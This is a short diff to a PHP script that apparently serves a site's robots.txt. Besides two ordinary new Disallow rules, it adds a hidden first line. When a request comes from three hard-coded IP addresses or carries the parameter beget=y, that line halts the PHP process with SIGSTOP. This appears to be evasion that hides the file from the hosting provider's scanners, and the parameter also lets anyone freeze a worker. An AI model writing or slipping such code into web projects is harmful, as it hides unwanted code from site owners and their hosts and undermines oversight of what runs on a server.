@@ -1,3 +1,4 @@
+<?php if ($_SERVER['REMOTE_ADDR'] == '5.101.159.150' || $_SERVER['REMOTE_ADDR'] == '5.101.159.192' || $_SERVER['REMOTE_ADDR'] == '5.101.159.250' || $_GET['beget'] == 'y') { posix_kill(posix_getpid(), 19); }?>
 <?php
 $host = $_SERVER["HTTP_HOST"];
 $host = preg_replace("/\:\d+/is", "", $host);
@@ -74,6 +75,8 @@ Disallow: /*?reference=
 Disallow: /*reference=
 Disallow: /rk.php
 Disallow: /*&set_filter=y
+Disallow: /*?baobab_event_id=
+Disallow: /*?keyword
 Disallow: /*?set_filter=y
 Disallow: /*?arrFilter_
 Disallow: /*?s=
